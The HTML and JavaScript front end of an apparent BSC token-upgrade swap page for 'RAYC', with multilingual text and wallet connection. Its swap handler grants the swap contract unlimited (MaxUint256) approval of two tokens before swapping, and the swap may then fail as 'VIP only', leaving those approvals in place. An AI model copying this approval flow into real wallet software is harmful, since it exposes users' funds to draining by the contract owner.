<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>RAYC 生态升级兑换中心</title>
<style>
  :root {
    --bg1: #1a0b2e; --bg2: #450d2a;
    --card-bg: rgba(26, 15, 35, 0.75);
    --txt: #f8fafc; --muted: #cbd5e1;
    --accent-pink: #ec4899; --accent-gold: #f59e0b; --accent-purple: #8b5cf6;
  }
  * { box-sizing: border-box; }
  
  body {
    margin: 0; color: var(--txt); font-family: system-ui, -apple-system, sans-serif;
    background: radial-gradient(circle at top left, var(--bg1) 0%, transparent 50%),
                radial-gradient(circle at bottom right, var(--bg2) 0%, transparent 50%),
                #09050f;
    background-attachment: fixed;
    display: flex; justify-content: center; align-items: flex-start;
    min-height: 100vh; padding: 80px 20px 40px;
    overflow-x: hidden;
    flex-direction: column;
  }

  /* 居中容器 */
  .main-container {
    width: 100%; max-width: 480px; margin: 0 auto; display: flex; flex-direction: column; gap: 15px;
  }

  /* 顶部导航 */
  .top-nav {
    position: fixed; top: 0; left: 0; right: 0; z-index: 100;
    display: flex; justify-content: space-between; align-items: center;
    padding: 15px 20px;
  }

  /* 返回按钮 */
  .back-btn {
    background: rgba(236, 72, 153, 0.15); border: 1px solid var(--accent-pink);
    color: #fbcfe8; padding: 10px 20px; border-radius: 30px;
    text-decoration: none; font-size: 14px; font-weight: bold;
    backdrop-filter: blur(10px); transition: all 0.3s ease;
    box-shadow: 0 0 15px rgba(236, 72, 153, 0.3);
    display: flex; align-items: center; gap: 6px;
  }
  .back-btn:hover { background: var(--accent-pink); color: #fff; transform: translateY(-2px); }

  /* 语言切换 */
  .lang-switch {
    background: rgba(0,0,0,0.5); border: 1px solid var(--accent-gold);
    color: #fff; border-radius: 20px; padding: 8px 12px;
    font-size: 13px; outline: none; cursor: pointer; backdrop-filter: blur(10px);
  }

  /* Logo */
  .logo-container {
    position: absolute; top: 15px; left: 50%; transform: translateX(-50%);
    z-index: 100; display: flex; flex-direction: column; align-items: center;
  }
  .logo-img {
    width: 80px; height: 80px; border-radius: 50%;
    object-fit: cover;
    animation: floatLogo 3s ease-in-out infinite alternate, glowLogo 2s ease-in-out infinite alternate;
  }
  @keyframes floatLogo { 0% { transform: translateY(0px); } 100% { transform: translateY(-10px); } }
  @keyframes glowLogo {
    0% { box-shadow: 0 0 10px var(--accent-gold), 0 0 20px var(--accent-pink); }
    100% { box-shadow: 0 0 25px var(--accent-gold), 0 0 40px var(--accent-pink); }
  }

  /* 卡片主体 */
  .card {
    width: 100%; background: var(--card-bg);
    border: 1px solid rgba(245, 158, 11, 0.3);
    border-radius: 28px; padding: 35px 30px;
    box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7), inset 0 0 20px rgba(236, 72, 153, 0.1);
    backdrop-filter: blur(20px); position: relative;
  }
  
  h1 {
    font-size: 22px; text-align: center; margin: 0 0 25px;
    background: linear-gradient(135deg, #fcd34d, #f472b6);
    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
    text-shadow: 0 0 20px rgba(244, 114, 182, 0.4); font-weight: 800;
  }

  /* 钱包栏 */
  .wallet-bar {
    display: flex; justify-content: space-between; align-items: center;
    background: rgba(0, 0, 0, 0.3); padding: 12px 18px; border-radius: 16px;
    margin-bottom: 25px; font-size: 13px; border: 1px solid rgba(255, 255, 255, 0.1);
  }
  .connect-btn {
    background: linear-gradient(135deg, var(--accent-pink), var(--accent-purple));
    color: #fff; border: none; padding: 8px 18px; border-radius: 10px;
    cursor: pointer; font-weight: bold; transition: 0.3s;
  }
  .connect-btn:hover { filter: brightness(1.2); }
  .connect-btn.hidden { display: none; }

  /* 输入框 */
  .input-box {
    background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(255, 255, 255, 0.08);
    border-radius: 20px; padding: 18px; margin-bottom: 16px; transition: 0.3s;
  }
  .input-box:focus-within { border-color: var(--accent-gold); box-shadow: 0 0 15px rgba(245, 158, 11, 0.2); }
  .input-box label { font-size: 13px; color: var(--muted); display: block; margin-bottom: 8px; font-weight: 600; }
  .input-box input {
    width: 100%; background: transparent; border: none; color: #fff;
    font-size: 24px; outline: none; font-weight: 900; letter-spacing: 1px;
  }
  .input-box input::placeholder { color: rgba(255, 255, 255, 0.2); }
  
  .info-row { display: flex; justify-content: space-between; font-size: 13px; color: var(--muted); margin-bottom: 10px; padding: 0 5px; }
  .info-row span:last-child { color: var(--txt); font-weight: bold; }
  
  .max-btn { color: var(--accent-gold); cursor: pointer; font-weight: bold; transition: 0.2s; }
  .max-btn:hover { text-shadow: 0 0 10px var(--accent-gold); }

  /* 主按钮 */
  .action-btn {
    position: relative; width: 100%; padding: 18px; border: none; border-radius: 20px;
    background: linear-gradient(135deg, #f59e0b, #ec4899);
    color: #fff; font-size: 18px; font-weight: 800; letter-spacing: 1px;
    cursor: pointer; margin-top: 25px; overflow: hidden; transition: 0.3s;
    box-shadow: 0 10px 20px -5px rgba(236, 72, 153, 0.5);
  }
  .action-btn::before {
    content: ''; position: absolute; top: 0; left: -100%;
    width: 100%; height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
    animation: sweep 3s infinite;
  }
  @keyframes sweep { 100% { left: 100%; } }
  .action-btn:hover:not(:disabled) { transform: translateY(-3px); box-shadow: 0 15px 25px -5px rgba(236, 72, 153, 0.7); }
  .action-btn:disabled { opacity: 0.5; cursor: not-allowed; box-shadow: none; }

  /* Toast */
  .toasts { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); display: flex; flex-direction: column; gap: 10px; z-index: 999; }
  .toast {
    background: rgba(26, 15, 35, 0.95); padding: 12px 24px; border-radius: 30px; font-size: 14px;
    border: 1px solid var(--accent-pink); box-shadow: 0 10px 20px rgba(0,0,0,0.5);
    animation: slidein 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); font-weight: bold;
  }
  @keyframes slidein { from { opacity: 0; transform: translateY(-30px); } to { opacity: 1; transform: none; } }
</style>
</head>
<body>

<!-- 顶部导航 -->
<div class="top-nav">
  <a href="index-6.html" class="back-btn" data-i18n="back_btn">← 返回</a>
  
  <div class="logo-container">
    <img src="https://i.imgs.ovh/2026/10/25/be84b9435a64d9394eb58156d4fadb8f.png" class="logo-img" alt="Logo" />
  </div>

  <select id="lang-switch" class="lang-switch" onchange="I18n.setLang(this.value)">
    <option value="zh-CN">简体中文</option>
    <option value="zh-TW">繁體中文</option>
    <option value="en">English</option>
    <option value="fr">Français</option>
  </select>
</div>

<div class="main-container">
    <!-- 主兑换卡片 -->
    <div class="card" style="margin-top: 40px;">
      <h1 data-i18n="title">🚀 RAYC 生态Swap闪兑</h1>
      
      <div class="wallet-bar">
        <span id="walletDisplay" style="font-family:monospace;" data-i18n="unconnected">🦊 未连接</span>
        <button id="connectBtn" class="connect-btn" data-i18n="connect">连接钱包</button>
      </div>

      <div class="input-box">
        <div style="display:flex; justify-content:space-between;">
          <label data-i18n="pay_label">💰 支付：RAYC</label>
          <label style="color:var(--accent-gold);"><span data-i18n="balance">余额</span>: <span id="balOld">0</span></label>
        </div>
        <input type="number" id="payAmount" placeholder="0" />
        <div class="info-row" style="margin-top:10px; margin-bottom:0; justify-content:flex-end;">
          <span class="max-btn" onclick="useMax()">MAX</span>
        </div>
      </div>

      <div style="text-align:center; margin:-10px 0; position:relative; z-index:10;">
        <div style="background:var(--card-bg); border:1px solid rgba(255,255,255,0.1); width:36px; height:36px; border-radius:50%; display:inline-flex; align-items:center; justify-content:center; color:var(--accent-gold); font-weight:bold; border: 1px solid var(--accent-gold);">
          ↓
        </div>
      </div>

      <div class="input-box" style="opacity:0.8;">
        <label data-i18n="receive_label">🪙 获得：新 RAYC-A</label>
        <input type="number" id="receiveAmount" placeholder="0" readonly />
      </div>

      <div class="info-row" style="margin-top:15px;">
        <span data-i18n="fee_label">⚡ 额外扣除 RAYT 手续费</span>
        <span id="feeRayt" style="color:var(--accent-pink);">--</span>
      </div>
      <div class="info-row">
        <span data-i18n="rayt_balance">💼 你的 RAYT 余额</span>
        <span id="balRayt">0</span>
      </div>
      <div class="info-row" style="margin-bottom: 15px;">
        <span data-i18n="swapped_amount">📈 已兑换 RAYC-A</span>
        <span id="swappedAmount" style="color: #10b981;">0</span>
      </div>

      <button class="action-btn" id="actionBtn" disabled data-i18n="swap_btn">请输入数量</button>
    </div>

    <!-- RAYC-A 合约地址卡片 -->
    <div class="card" style="padding: 20px 25px; border-color: rgba(255,255,255,0.1);">
      <div style="font-size: 13px; color: var(--muted); margin-bottom: 10px; text-align: center;" data-i18n="rayca_contract">RAYC-A 合约地址</div>
      <div style="display: flex; align-items: center; justify-content: space-between; background: rgba(0,0,0,0.4); padding: 12px 15px; border-radius: 16px; border: 1px solid rgba(255,255,255,0.05);">
        <span id="raycaAddress" style="font-family: monospace; font-size: 12px; color: #fcd34d; word-break: break-all; line-height: 1.4;">0x3479bfA6e0f681A3763961b95759f477DE7Cc9a9</span>
        <button onclick="copyRaycaAddress()" style="background: linear-gradient(135deg, var(--accent-purple), var(--accent-pink)); border: none; color: white; padding: 8px 14px; border-radius: 10px; cursor: pointer; font-size: 12px; font-weight: bold; white-space: nowrap; transition: 0.3s; margin-left: 10px; box-shadow: 0 4px 10px rgba(236,72,153,0.3);" data-i18n="copy_btn">复制</button>
      </div>
    </div>
</div>

<div class="toasts" id="toasts"></div>

<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<script>
// ==================== 多语言字典 ====================
const i18nData = {
  'zh-CN': {

    unconnected: '🦊 未连接', connect: '连接钱包',
    pay_label: '💰 支付：RAYC', balance: '余额', receive_label: '🪙 获得：新 RAYC-A',
    fee_label: '⚡ 额外扣除 RAYT 手续费', rayt_balance: '💼 你的 RAYT 余额', swapped_amount: '📈 已兑换 RAYC-A',
    swap_btn: '开始兑换', swap_disabled: '请输入数量', swap_not_open: '兑换未开启',
    connecting: '连接中...', not_installed: '请安装钱包',
    check_auth: '检查授权中...', auth_old: '授权 RAYC...', auth_rayt: '授权 RAYT...', swapping: '兑换中...',
    success: '🎉 兑换成功！', fail: '兑换失败', not_open_toast: '兑换暂未开启，请稍后再试',
    rayca_contract: 'RAYC-A 合约地址', copy_btn: '复制', copy_success: '✅ 地址已复制！',
    not_eligible: '❌ 兑换失败：仅限参与托管的 VIP 客户兑换！'
  },
  'zh-TW': {
    back_btn: '← 返回', title: '🚀 RAYC 生態升級兌換',
    unconnected: '🦊 未連接', connect: '連接錢包',
    pay_label: '💰 支付：RAYC', balance: '餘額', receive_label: '🪙 獲得：新 RAYC-A',
    fee_label: '⚡ 額外扣除 RAYT 手續費', rayt_balance: '💼 你的 RAYT 餘額', swapped_amount: '📈 已兌換 RAYC-A',
    swap_btn: '開始兌換', swap_disabled: '請輸入數量', swap_not_open: '兌換未開啟',
    connecting: '連接中...', not_installed: '請安裝錢包',
    check_auth: '檢查授權中...', auth_old: '授權 RAYC...', auth_rayt: '授權 RAYT...', swapping: '兌換中...',
    success: '🎉 兌換成功！', fail: '兌換失敗', not_open_toast: '兌換暫未開啟，請稍後再試',
    rayca_contract: 'RAYC-A 合約地址', copy_btn: '複製', copy_success: '✅ 地址已複製！',
    not_eligible: '❌ 兌換失敗：僅限參與托管的 VIP 客戶兌換！'
  },
  'en': {
    back_btn: '← Back', title: '🚀 RAYC Eco Upgrade Swap',
    unconnected: '🦊 Disconnected', connect: 'Connect Wallet',
    pay_label: '💰 Pay: RAYC', balance: 'Balance', receive_label: '🪙 Receive: New RAYC-A',
    fee_label: '⚡ Extra RAYT Fee', rayt_balance: '💼 Your RAYT Balance', swapped_amount: '📈 Swapped RAYC-A',
    swap_btn: 'Start Swap', swap_disabled: 'Enter Amount', swap_not_open: 'Swap Not Open',
    connecting: 'Connecting...', not_installed: 'Please install Wallet',
    check_auth: 'Checking auth...', auth_old: 'Approve RAYC...', auth_rayt: 'Approve RAYT...', swapping: 'Swapping...',
    success: '🎉 Swap Successful!', fail: 'Swap Failed', not_open_toast: 'Swap is not open yet.',
    rayca_contract: 'RAYC-A Contract', copy_btn: 'Copy', copy_success: '✅ Address Copied!',
    not_eligible: '❌ Swap Failed: Only VIP custodians are eligible!'
  },
  'fr': {
    back_btn: '← Retour', title: '🚀 Échange de Mise à Niveau RAYC',
    unconnected: '🦊 Non connecté', connect: 'Connecter',
    pay_label: '💰 Payer : RAYC', balance: 'Solde', receive_label: '🪙 Recevoir : Nouveau RAYC-A',
    fee_label: '⚡ Frais RAYT Supplémentaires', rayt_balance: '💼 Votre Solde RAYT', swapped_amount: '📈 RAYC-A Échangé',
    swap_btn: 'Commencer l\'Échange', swap_disabled: 'Entrez le Montant', swap_not_open: 'Échange non ouvert',
    connecting: 'Connexion...', not_installed: 'Veuillez installer le Portefeuille',
    check_auth: 'Vérification de l\'autorisation...', auth_old: 'Approuver RAYC...', auth_rayt: 'Approuver RAYT...', swapping: 'Échange en cours...',
    success: '🎉 Échange Réussi !', fail: 'Échec de l\'échange', not_open_toast: 'L\'échange n\'est pas encore ouvert.',
    rayca_contract: 'Contrat RAYC-A', copy_btn: 'Copier', copy_success: '✅ Adresse Copiée !',
    not_eligible: '❌ Échange Échoué : Seuls les dépositaires VIP sont éligibles !'
  }
};

const I18n = {
  currentLang: localStorage.getItem('trade_lang') || 'zh-CN',
  init() {
    document.getElementById('lang-switch').value = this.currentLang;
    this.applyLang(this.currentLang);
  },
  setLang(lang) {
    this.currentLang = lang;
    localStorage.setItem('trade_lang', lang);
    this.applyLang(lang);
  },
  t(key) {
    return i18nData[this.currentLang][key] || i18nData['zh-CN'][key] || key;
  },
  applyLang(lang) {
    document.querySelectorAll('[data-i18n]').forEach(el => {
      const key = el.getAttribute('data-i18n');
      if (el.tagName === 'INPUT') {
        el.placeholder = this.t(key);
      } else {
        el.innerText = this.t(key);
      }
    });
    const btn = document.getElementById('actionBtn');
    if (btn && btn.disabled) {
      const val = document.getElementById('payAmount').value;
      if (!val || parseFloat(val) <= 0) btn.innerText = this.t('swap_disabled');
      else if (btn.innerText !== this.t('swapping') && btn.innerText !== this.t('check_auth') && btn.innerText !== this.t('auth_old') && btn.innerText !== this.t('auth_rayt')) {
        btn.innerText = this.t('swap_not_open');
      }
    }
  }
};

// ==================== 合约配置 ====================
const CONFIG = {
    chainId: 56,
    swapAddress: "0x9C9B150f41c445d89D0AeB011706b8b7Ff86c8F0", // 刚刚部署的 V5 合约
    raycOld: "0x1AAafebB2247616a8f290115df8d63Acaac47d49",
    raycA: "0x3479bfA6e0f681A3763961b95759f477DE7Cc9a9",
    raytToken: "0x88201e877C4FC38D2C1c3AF20A32234629f02405"
};

const SWAP_ABI = [
  "function swapEnabled() view returns (bool)",
  "function useDynamicPrice() view returns (bool)",
  "function manualRatioNum() view returns (uint256)",
  "function manualRatioDen() view returns (uint256)",
  "function feeRAYTAmount() view returns (uint256)",
  "function getTokenPriceInUSDT(address token) view returns (uint256)",
  "function swap(uint256 amountRayc)",
  "function userSwapStats(address) view returns (uint256 count, uint256 raycIn, uint256 raycAOut, uint256 raytFee)"
];
const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function allowance(address,address) view returns (uint256)",
  "function approve(address,uint256) returns (bool)"
];

// ==================== 全局变量 ====================
let provider, signer, userAddress;
let swapContract, oldContract, aContract, raytContract;
let ratioNum = 1, ratioDen = 1, feeRaytWei = 0, isDynamic = false;

const $ = (id) => document.getElementById(id);

function toast(msg, err=false) { 
  const el = document.createElement("div"); el.className="toast"; el.innerText=msg; 
  if(err) el.style.borderColor = "#ff5c5c";
  $("toasts").appendChild(el); setTimeout(()=>el.remove(),3000); 
}

// 复制地址逻辑
function copyRaycaAddress() {
  const addr = "0x3479bfA6e0f681A3763961b95759f477DE7Cc9a9";
  navigator.clipboard.writeText(addr).then(() => {
    toast(I18n.t('copy_success'));
  }).catch(err => {
    toast('复制失败，请手动选中复制', true);
  });
}

// ==================== 完美兼容所有钱包逻辑 ====================
function getInjectedProvider(){
    if (window.ethereum) return window.ethereum;
    if (window.okxwallet && window.okxwallet.ethereum) return window.okxwallet.ethereum;
    if (window.binancew3w && window.binancew3w.ethereum) return window.binancew3w.ethereum;
    if (window.tokenpocket && window.tokenpocket.ethereum) return window.tokenpocket.ethereum;
    return null;
}

async function initWallet(address) {
    if (userAddress && userAddress.toLowerCase() === address.toLowerCase()) return;
    try {
        const inj = getInjectedProvider();
        if (!inj) {
            alert(I18n.t('not_installed'));
            return;
        }
        
        provider = new ethers.providers.Web3Provider(inj, "any");
        signer = provider.getSigner();
        userAddress = address;

        const net = await provider.getNetwork();
        if(net.chainId !== CONFIG.chainId){ 
            alert("请切换到 BSC 主网 (Chain ID: 56)");
            return; 
        }

        $("walletDisplay").innerText = userAddress.slice(0,6)+'...'+userAddress.slice(-4);
        $("connectBtn").classList.add("hidden");

        swapContract = new ethers.Contract(CONFIG.swapAddress, SWAP_ABI, signer);
        oldContract = new ethers.Contract(CONFIG.raycOld, ERC20_ABI, signer);
        aContract = new ethers.Contract(CONFIG.raycA, ERC20_ABI, signer);
        raytContract = new ethers.Contract(CONFIG.raytToken, ERC20_ABI, signer);

        await loadData();
    } catch(e) { 
        console.error('初始化失败:', e); 
    }
}

$("connectBtn").onclick = async () => {
    const inj = getInjectedProvider();
    if(!inj) return alert(I18n.t('not_installed'));
    try{
        const accounts = await inj.request({method:'eth_requestAccounts'});
        await initWallet(accounts[0]);
    }catch(e){ alert(I18n.t('fail')+e.message); }
};

// 页面加载时静默连接
window.addEventListener('DOMContentLoaded', async () => {
    I18n.init();
    const urlParams = new URLSearchParams(window.location.search);
    const walletParam = urlParams.get('wallet');
    
    if (walletParam && ethers.utils.isAddress(walletParam)) {
        await initWallet(walletParam);
    } else {
        const inj = getInjectedProvider();
        if (inj) {
            try {
                const accounts = await inj.request({ method: 'eth_accounts' });
                if (accounts.length > 0) await initWallet(accounts[0]);
            } catch (e) { console.log('静默连接失败', e); }
        }
    }
});

// 监听账户和网络变化
const injected = getInjectedProvider();
if (injected) {
    injected.on && injected.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) location.reload();
        else initWallet(accounts[0]);
    });
    injected.on && injected.on('chainChanged', () => { location.reload(); });
}

// ==================== 数据加载与兑换逻辑 ====================
async function loadData() {
  const isEnabled = await swapContract.swapEnabled();
  if(!isEnabled) { 
      toast(I18n.t('not_open_toast'), true); 
      $("actionBtn").innerText = I18n.t('swap_not_open'); 
      return; 
  }

  isDynamic = await swapContract.useDynamicPrice();
  ratioNum = await swapContract.manualRatioNum();
  ratioDen = await swapContract.manualRatioDen();
  feeRaytWei = await swapContract.feeRAYTAmount();

  const [balOld, balRayt, stats] = await Promise.all([
    oldContract.balanceOf(userAddress),
    raytContract.balanceOf(userAddress),
    swapContract.userSwapStats(userAddress)
  ]);

  $("balOld").innerText = parseFloat(ethers.utils.formatUnits(balOld, 18)).toLocaleString(undefined, {maximumFractionDigits: 4});
  $("balRayt").innerText = parseFloat(ethers.utils.formatUnits(balRayt, 18)).toLocaleString(undefined, {maximumFractionDigits: 4});
  $("feeRayt").innerText = ethers.utils.formatUnits(feeRaytWei, 18) + " RAYT";
  
  $("swappedAmount").innerText = parseFloat(ethers.utils.formatUnits(stats.raycAOut, 18)).toLocaleString(undefined, {maximumFractionDigits: 2}) + " RAYC-A";

  $("actionBtn").innerText = I18n.t('swap_btn');
  $("actionBtn").disabled = false;
}

$("payAmount").addEventListener("input", async () => {
  const valStr = $("payAmount").value;
  const val = parseFloat(valStr);
  const btn = $("actionBtn");
  
  if(isNaN(val) || val <= 0) {
    $("receiveAmount").value = "";
    if(!btn.dataset.loading) btn.innerText = I18n.t('swap_disabled');
    return;
  }
  
  if(!btn.dataset.loading) btn.innerText = I18n.t('swap_btn');

  if (isDynamic) {
    try {
      const amtWei = ethers.utils.parseUnits(valStr, 18);
      const priceRayc = await swapContract.getTokenPriceInUSDT(CONFIG.raycOld);
      const priceRaycA = await swapContract.getTokenPriceInUSDT(CONFIG.raycA);
      if (priceRayc.gt(0) && priceRaycA.gt(0)) {
        const outWei = amtWei.mul(priceRayc).div(priceRaycA);
        $("receiveAmount").value = parseFloat(ethers.utils.formatUnits(outWei, 18)).toFixed(4);
      } else {
        const outVal = (val * Number(ratioDen)) / Number(ratioNum);
        $("receiveAmount").value = outVal.toFixed(4);
      }
    } catch(e) {}
  } else {
    const outVal = (val * Number(ratioDen)) / Number(ratioNum);
    $("receiveAmount").value = outVal.toFixed(4);
  }
});

function useMax() {
  $("payAmount").value = $("balOld").innerText.replace(/,/g, '');
  $("payAmount").dispatchEvent(new Event('input'));
}

$("actionBtn").onclick = async () => {
  const amtStr = $("payAmount").value;
  if(!amtStr || parseFloat(amtStr) <= 0) return toast(I18n.t('swap_disabled'), true);
  const amt = ethers.utils.parseUnits(amtStr, 18);

  const btn = $("actionBtn");
  btn.disabled = true; btn.dataset.loading = "true";
  
  try {
    btn.innerText = I18n.t('check_auth');
    
    // 授权旧 RAYC
    const alOld = await oldContract.allowance(userAddress, CONFIG.swapAddress);
    if(alOld.lt(amt)) {
      btn.innerText = I18n.t('auth_old');
      const tx = await oldContract.approve(CONFIG.swapAddress, ethers.constants.MaxUint256);
      await tx.wait();
    }

    // 授权 RAYT
    if(feeRaytWei.gt(0)) {
      const alRayt = await raytContract.allowance(userAddress, CONFIG.swapAddress);
      if(alRayt.lt(feeRaytWei)) {
        btn.innerText = I18n.t('auth_rayt');
        const tx = await raytContract.approve(CONFIG.swapAddress, ethers.constants.MaxUint256);
        await tx.wait();
      }
    }

    btn.innerText = I18n.t('swapping');
    const tx2 = await swapContract.swap(amt);
    await tx2.wait();
    
    toast(I18n.t('success'));
    $("payAmount").value = ""; $("receiveAmount").value = "";
    await loadData();
  } catch(e) {
    console.error(e);
    // 👇 拦截 V5 合约专属的非托管用户报错
    if (e.message && e.message.includes("Not eligible") || (e.reason && e.reason.includes("Not eligible"))) {
      toast(I18n.t('not_eligible'), true);
    } else {
      toast(e.reason || I18n.t('fail'), true);
    }
  } finally {
    btn.dataset.loading = "";
    btn.innerText = I18n.t('swap_btn'); btn.disabled = false;
  }
};
</script>
</body>
</html>
